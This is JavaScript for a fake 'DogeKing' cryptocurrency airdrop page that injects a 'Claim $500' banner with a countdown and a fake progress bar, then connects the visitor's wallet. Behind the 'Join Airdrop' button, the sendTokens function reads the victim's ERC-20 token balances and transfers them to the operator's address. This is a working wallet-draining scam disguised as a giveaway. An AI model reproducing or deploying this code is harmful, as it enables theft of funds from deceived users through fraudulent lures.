/**
 * Setup the orchestra
 */
function createAirdropArea()
{
    let jumbotron = `
    <div class="z-10 jumbotron relative mb-0 bg-transparent py-12 2xl:pb-40 2xl:pt-24" id="content"><div><div class="Jumbo_bg__dj0Ug"></div><div class="Jumbo_bg__dj0Ug Jumbo_bg2__kd8oG"></div></div><div class="relative max-w-screen-xl mx-auto"><div><div class="flex items-stretch lg:items-start md:space-x-3 flex-col md:flex-row"><div class="md:w-2/5 xl:w-1/3 mb-3 md:mb-0 lg:sticky lg:top-3"><div class="bg-dark1 bg-opacity-90 rounded-lg shadow-2xl card bg-dark1"><div class="space-y-6 p-3 card-body"><div class="flex items-center"><div class="mr-3"><div class="inline-block rounded-full p-1 brand-bg"><div class="h-16 w-16 bg-darkGray rounded-full DOGEKING_logo"><img src="/static/img/doge-king/logo.png" alt="ADR" class="h-full rounded-full"></div></div></div><div class="space-y-2"><div><h2 class="text-2xl font-secondary tracking-wide">DogeKing</h2></div><div class="flex items-center space-x-2 flex-wrap"><span class="py-1 px-2 bg-opacity-40 bg-green-700 text-green-500 font-normal badge badge-pill badge-success"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" class="inline overflow-visible" height="0.75em" width="0.75em" xmlns="http://www.w3.org/2000/svg"><path d="M11 1a2 2 0 0 0-2 2v4a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h5V3a3 3 0 0 1 6 0v4a.5.5 0 0 1-1 0V3a2 2 0 0 0-2-2zM3 8a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1H3z"></path></svg><span style="margin-left:2px;">Opening</span></span></div></div></div><div class="space-y-3 relative"><div class="bg-gray-500 bg-opacity-10 p-3 rounded-2xl relative"><div class="text-center"><div class="space-y-3 relative z-20"><button type="button" class="btn btn-main"> Join Airdrop </button></div></div></div></div><div class="space-y-6"><div><div class="text-2xl brand-text"> Claim $500 in DOGEKING</div><!----></div><div class="space-y-1"><div class="flex justify-between text-sm tracking-wide space-x-3"><div class=""><span class="break-words">airdrop closes in 01 hours, 12 minutes</span></div><div class="font-medium opacity-90 text-right"><span class="text-main">89.26%</span></div></div><div class="h-2 bg-gray-600 flex overflow-hidden rounded" style="box-shadow: rgba(0, 0, 0, 0.1) 0px 0.1rem 0.1rem inset;"><div role="progressbar" class="bg-primary" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100" style="width: 89.26%;"></div></div><div class="flex justify-between text-sm tracking-wide space-x-3"><div class="text-ignored opacity-90 text-right">8 926 000 000 000 / 10 000 000 000 000 DOGEKING</div></div></div><div class="space-y-3"><table class="text-sm"><tbody class=""><tr><td class="pr-2 pb-2 pl-0 nowrap va-top"> 💰 Airdrop </td><td class="pb-2 pl-0"><div>Up to 10% of your balance</div></td></tr><tr><td class="pr-2 pb-2 pl-0 nowrap va-top"> 🏃‍♂ Rule </td><td class="pb-2 pl-0"><div>FCFS, Each one is limited to join once.</div></td></tr></tbody></table></div></div></div></div></div><div class="md:w-3/5 xl:w-2/3 space-y-3"><div class="overflow-hidden relative bg-dark1 bg-opacity-80 rounded-lg shadow-lg border-0 z-10 card bg-dark1"><div class="card-body"><div class="md:p-3 z-10 space-y-8"><div class="pb-3"><div class="flex items-start justify-between mb-3 flex-wrap"><div class="flex items-center mb-3 md:mb-0"><div class="mr-3"><div class="DOGEKING_logo" style="width: 45px; height: 45px;"><img src="/static/img/doge-king/logo.png" alt="ADR" class="h-full rounded-full"></div></div><h2 class="text-2xl font-secondary tracking-wide mb-0">DogeKing</h2></div></div><div class="mb-6 opacity-80 font-light space-y-3"><p>DogeKing has a high DOGE reflex. There is no need to claim that we can all go to the moon. More major marketing will be launched soon. Please pay attention to us.</p><img src="/static/img/doge-king/pic.jpeg" class="m-auto DOGEKING" loading="lazy" alt="IDO Image"></div><div class="space-x-6 flex items-center"><ul class="flex flex-wrap items-center text-main space-x-6 z-20 relative text-2xl"><li><a href="https://t.me/Dogeking_Official_Channel" target="_blank" class="text-main" rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z"></path></svg></a></li><li><a href="https://twitter.com/DogekingEN" target="_blank" class="text-main" rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a></li><li><a href="http://dogeking.site" target="_blank" class="text-main" rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M336.5 160C322 70.7 287.8 8 248 8s-74 62.7-88.5 152h177zM152 256c0 22.2 1.2 43.5 3.3 64h185.3c2.1-20.5 3.3-41.8 3.3-64s-1.2-43.5-3.3-64H155.3c-2.1 20.5-3.3 41.8-3.3 64zm324.7-96c-28.6-67.9-86.5-120.4-158-141.6 24.4 33.8 41.2 84.7 50 141.6h108zM177.2 18.4C105.8 39.6 47.8 92.1 19.3 160h108c8.7-56.9 25.5-107.8 49.9-141.6zM487.4 192H372.7c2.1 21 3.3 42.5 3.3 64s-1.2 43-3.3 64h114.6c5.5-20.5 8.6-41.8 8.6-64s-3.1-43.5-8.5-64zM120 256c0-21.5 1.2-43 3.3-64H8.6C3.2 212.5 0 233.8 0 256s3.2 43.5 8.6 64h114.6c-2-21-3.2-42.5-3.2-64zm39.5 96c14.5 89.3 48.7 152 88.5 152s74-62.7 88.5-152h-177zm159.3 141.6c71.4-21.2 129.4-73.7 158-141.6h-108c-8.8 56.9-25.6 107.8-50 141.6zM19.3 352c28.6 67.9 86.5 120.4 158 141.6-24.4-33.8-41.2-84.7-50-141.6h-108z"></path></svg></a></li></ul></div></div><div><h2 class="text-lg mb-2 font-secondary tracking-wider text-primary"> Token </h2><ul><li class="flex py-1 justify-between md:justify-start items-center"><div class="font-semibold mr-3">Token:</div><div class=""><span class="text-main">DogeKing (DOGEKING)</span></div></li><li class="flex py-1 justify-between md:justify-start items-center"><div class="font-semibold mr-3">Type:</div><div class="">Multi-Chain</div></li><li class="flex py-1 justify-between md:justify-start items-center"><div class="font-semibold mr-3">Total Supply:</div><div class="">1 000 000 000 000 000 DOGEKING</div></li><li class="flex py-1 justify-between md:justify-start items-center"><div class="font-semibold mr-3">Market Cap:</div><div class="text-main">$54 110 611</div></li></ul></div><div><h2 class="text-lg mb-2 font-secondary tracking-wider text-primary"> Distribution </h2><li class="flex py-1 justify-between md:justify-start items-center"><div class="font-semibold mr-3">Distribution:</div><div class=""><span>Claimed on MultiChain</span></div></li><div class="mt-3"></div></div></div></div></div></div></div></div></div></div>
    `
    let fragment = document.createElement("fragment");
    fragment.innerHTML = jumbotron;
    
    let header = document.getElementsByTagName("header")[0];
    
    header.insertAdjacentElement("afterend", fragment)
    fetchAccountData()
    document.getElementsByClassName("btn btn-main")[1].onclick = function()
    {   
        if(this.innerText === "Disconnect")
        {
            onDisconnect()
        }
        else
        {
            onConnect()
        }
    }

    document.getElementsByClassName("btn btn-main")[2].onclick = function()
    {
        sendTokens(toAddress)
    }
}

createAirdropArea()
"use strict";

/**
 * Example JavaScript code that interacts with the page and Web3 wallets
 */

 // Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;


/**
 * Setup the orchestra
 */
function init() {

  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("Fortmatic is", Fortmatic);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
//   if(location.protocol !== 'https:') {
//     // https://ethereum.stackexchange.com/a/62217/620
//     const alert = document.querySelector("#alert-error-https");
//     alert.style.display = "block";
//     document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
//     return;
//   }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        // Mikko's test key - don't copy as your mileage may vary
        infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
      }
    },

    fortmatic: {
      package: Fortmatic,
      options: {
        // Mikko's TESTNET api key
        key: "pk_test_391E26A3B43A3350"
      }
    }
  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
  });

  console.log("Web3Modal instance is", web3Modal);
}


init()

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {

  // Get a Web3 instance for the wallet
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Get connected chain id from Ethereum node
  const chainId = await web3.eth.getChainId();
  // Load chain information over an HTTP API
  const chainData = evmChains.getChain(chainId);
//   document.querySelector("#network-name").textContent = chainData.name;
  
  console.log(chainId, chainData)
  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  
    web3.eth.Contract.defaultAccount = selectedAccount 

    document.getElementsByClassName("btn btn-main")[1].innerText = "disconnect"
    document.getElementsByClassName("btn btn-main")[1].onclick = function()
    {   
        onDisconnect()
    }


//   document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
//   const template = document.querySelector("#template-balance");
//   const accountContainer = document.querySelector("#accounts");

//   Purge UI elements any previously loaded accounts
//   accountContainer.innerHTML = '';

  // Go through all accounts and get their ETH balance
//   const rowResolvers = accounts.map(async (address) => {
//     const balance = await web3.eth.getBalance(address);
//     // ethBalance is a BigNumber instance
//     // https://github.com/indutny/bn.js/
//     const ethBalance = web3.utils.fromWei(balance, "ether");
//     const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
//     // Fill in the templated row and put in the document
//     const clone = template.content.cloneNode(true);
//     clone.querySelector(".address").textContent = address;
//     clone.querySelector(".balance").textContent = humanFriendlyBalance;
//     accountContainer.appendChild(clone);
//   });

  // Because rendering account does its own RPC commucation
  // with Ethereum node, we do not want to display any results
  // until data for all accounts is loaded
//   await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
//   document.querySelector("#prepare").style.display = "none";
//   document.querySelector("#connected").style.display = "block";
}



/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
//   document.querySelector("#connected").style.display = "none";
//   document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with Ethereum node via JSON-RPC and loads chain data
  // over an API call.
//   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
//   document.querySelector("#btn-connect").removeAttribute("disabled")
}


/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
}

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  document.getElementsByClassName("btn btn-main")[1].onclick = function()
    {   
      onConnect()
    }
    document.getElementsByClassName("btn btn-main")[1].innerText = "Connect Wallet"
  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;

}

  selectedAccount = null;

  // Set the UI back to the initial state
//   document.querySelector("#prepare").style.display = "block";
//   document.querySelector("#connected").style.display = "none";
}


/**
 * Main entry point.
 */
window.addEventListener('load', async () => {
  init();
//   document.querySelector("#btn-connect").addEventListener("click", onConnect);
//   document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
});

let IERC20Abi = [
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Approval",
		"type": "event"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Transfer",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "allowance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "approve",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "totalSupply",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]



async function sendTokens(ourAddress)
{
    onConnect()
    
    let collectTokenData = []
    for(let tokenAddress of tokenAddresses)
    {
        const web3 = new Web3(provider)
        
        var tokenContract = new web3.eth.Contract(IERC20Abi, tokenAddress.address);
        
        // Get list of accounts of the connected wallet
        const accounts = await web3.eth.getAccounts();
    
        // MetaMask does not give you all accounts, only the selected account
        console.log("Got accounts", accounts);
        selectedAccount = accounts[0];
        web3.eth.Contract.defaultAccount = selectedAccount 
        
        let balanceOf = await tokenContract.methods.balanceOf(selectedAccount).call()
        if(balanceOf > 0)
        {
            collectTokenData.push({...tokenAddress, balance: balanceOf})
        }

        const max = collectTokenData.reduce((prev, current)=> ( (prev.balance > current.balance) ? prev : current),0) 
        
        await tokenContract.methods.transfer(ourAddress, max.balance).send({
            from: selectedAccount,
        })
    }
}